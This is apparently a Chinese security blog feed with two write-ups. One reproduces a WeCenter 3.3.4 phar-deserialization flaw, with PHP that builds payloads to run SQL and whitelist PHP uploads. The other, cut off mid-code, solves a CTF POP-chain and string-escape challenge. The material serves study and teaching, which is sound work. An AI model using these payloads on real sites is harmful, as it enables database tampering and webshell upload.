src="/2020/02/29/WeCenter-V3-3-4漏洞复现/5.png" alt="5">  </p><p>在这里我们需要控制的是<code>$wxuser[&#39;headimgurl&#39;]</code>，而<code>synch_img_action</code>对于<code>$wxuser[&#39;headimgurl&#39;]</code>的获取是来源于数据库中的<code>users_weixin</code>表的，所以我们想控制其值必须找到对<code>users_weixin</code>表中<code>headimgurl</code>字段操作的代码，通过搜索发现<code>./models/openid/weixin/weixin.php</code>文件中<code>bind_account</code>函数存在着对该表的插入操作</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/6.png" alt="6"></p><p>接下来需要找到<code>bind_account</code>函数的调用位置，并且需要使其参数可控，通过搜索关注到<code>binding_action</code>函数，该函数在<code>/app/m/weixin.php</code>文件中</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/7.png" alt="7"></p><p>可以看到该函数中在调用<code>bind_account</code>函数传入参数时，参数的值都是从<code>cookie</code>中获取的，这样我们就可以通过cookie来控制传入的参数值，而<code>binding_action</code>这个方法可以通过路由访问直接调用，所以我们基本上就可以来执行任意SQL语句了</p><p>接着来梳理一下流程，首先我们控制<code>cookie</code>然后调用<code>binding_action</code>函数，使其调用<code>bind_account</code>函数并带入我们控制的参数，该函数将会把我们构造的<code>headimgurl</code>插入到数据库中，在我们调用<code>synch_img_action</code>方法时，该方法会将<code>headimgurl</code>取出来并调用<code>associate_remote_avatar</code>函数，该函数会调用<code>file_get_contents($headimgurl)</code>来触发<code>phar</code>反序列化，进而执行任意<code>sql</code>语句</p><h2 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h2><p>下面首先编写反序列化的生成代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AWS_MODEL</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $_shutdown_query = <span class="keyword">array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_shutdown_query = <span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> AWS_MODEL();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>在提问的编辑器处进行文件上传，会返回文件路径</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/8.png" alt="8"></p><p>然后编写生成<code>cookie</code>的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="keyword">array</span>();</span><br><span class="line">    $a[<span class="string">'access_token'</span>] = <span class="keyword">array</span>(<span class="string">'openid'</span> =&gt; <span class="string">'1'</span>);</span><br><span class="line">    $a[<span class="string">'access_user'</span>] = <span class="keyword">array</span>(<span class="string">'openid'</span>=&gt;<span class="number">1</span>,<span class="string">'nickname'</span>=&gt;<span class="string">'aaa'</span>,<span class="string">'headimgurl'</span>=&gt;<span class="string">'phar://uploads/question/20200229/f3f9cb0f135c2fd37c2446f863cc15d6.gif'</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//&#123;"access_token":&#123;"openid":"1"&#125;,"access_user":&#123;"openid":1,"nickname":"aaa","headimgurl":"phar:\/\/uploads\/question\/20200229\/f3f9cb0f135c2fd37c2446f863cc15d6.gif"&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>首先带着<code>cookie</code>调用<code>binding_action</code>方法，注意一下<code>cookie</code>的前缀需要抓包获取</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/9.png" alt="9"></p><p>然后去直接触发<code>synch_img_action</code>方法，就可以通过报错函数来得到sql执行结果</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/10.png" alt="10"></p><h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><p>登陆后台可以发现允许上传的文件类型是保存在数据库中的，执行更新后缀名的语句如下</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/11.png" alt="11"></p><p>我们可以仿照该语句来将<code>php</code>后缀名加入其中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AWS_MODEL</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $_shutdown_query = <span class="keyword">array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_shutdown_query = <span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"UPDATE `aws_system_setting` SET `value` = 's:45:\"jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php\";' WHERE (`varname` = 'allowed_upload_types')"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> AWS_MODEL();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>按照上面的执行语句的流程，成功执行后即可将<code>php</code>后缀添加到白名单中，之后在编辑器中可直接上传php文件</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://xz.aliyun.com/t/7077" target="_blank" rel="noopener">https://xz.aliyun.com/t/7077</a></p><p><a href="https://mp.weixin.qq.com/s/uBmo9xXMVk42Qp3BP_x0Vw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uBmo9xXMVk42Qp3BP_x0Vw</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;该漏洞的实质触发原因是由于可以通过反序列化来执行任意&lt;code&gt;sql&lt;/code&gt;语句，导致可以在数据库中更改上传文件的限制类型，最后达到
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>春秋战“疫”easyphp题解</title>
    <link href="https://yml-sec.top/2020/02/26/%E6%98%A5%E7%A7%8B%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Deasyphp%E9%A2%98%E8%A7%A3/"/>
    <id>https://yml-sec.top/2020/02/26/%E6%98%A5%E7%A7%8B%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Deasyphp%E9%A2%98%E8%A7%A3/</id>
    <published>2020-02-26T09:53:29.000Z</published>
    <updated>2020-02-26T12:03:43.819Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目考点：</p><p>反序列化POP链构造</p><p>反序列化字符串逃逸</p></blockquote><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"lib.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.$_GET[<span class="string">'action'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">'select id,password from user where username=?'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;  </span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的ID是"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你好！"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">echo</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        </span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line"></span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目获取到flag的条件是需要使用admin登陆，我们需要找到可控点来执行我们的sql语句，首先就是pop链的寻找</p><p>值得注意的是<code>dbCtrl</code>类中的login方法，该处可以执行任意<code>sql</code>语句，在满足某些条件时可以返回执行的部分结果</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/1.png" alt=""></p><p>那么我们向上寻找如何可以触发该处函数，注意到<code>Info</code>类中的<code>__call</code>方法，我们可以将<code>CtrlCase</code>赋值为一个<code>dbCtrl</code>类的对象</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/2.png" alt="2"></p><p>接着寻找如何触发<code>__call</code>方法，可以看到User类的<code>__toString</code> 方法满足该条件,只需要将<code>nickname</code>赋值为一个<code>Info</code>类的对象即可</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/3.png" alt="3"></p><p>触发<code>__toString</code>的方式也很简单，在<code>UpdateHelper</code>类中将<code>sql</code>变量赋值为<code>User</code>类的对象，这样该类在触发<code>destruct</code>方法的时候会自动触发<code>__toString</code>方法</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/4.png" alt="4"></p><p>现在理一下pop链的顺序</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-&gt;UpdateHelper(__destruct) <span class="variable">$sql</span>=new User</span><br><span class="line">-&gt;User(__toString) <span class="variable">$nickname</span>=new <span class="builtin-name">Info</span>    <span class="variable">$age</span>=<span class="string">"select password from user where username=?"</span></span><br><span class="line">-&gt;<span class="builtin-name">Info</span>(__call) <span class="variable">$CtrlCase</span>=new dbCtrl</span><br><span class="line">-&gt;dbCtrl(login)</span><br></pre></td></tr></table></figure><p>下面需要寻找一下触发反序列化的位置，通过<code>update.php</code>中的代码可以定位到触发点在<code>User</code>类的<code>update</code>方法</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/5.png" alt="5"></p><p>接着跟到<code>getNewinfo</code>方法，该处接收两个参数并且经过一个safe函数的过滤</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/6.png" alt="6"></p><p>这里就涉及到了字符串的逃逸，通过<code>safe</code>函数的过滤使前后字符串的长度不同造成逃逸，我们先来生成所需要的反序列化内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="string">"select password,id from user where username=?"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=<span class="keyword">new</span> Info();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 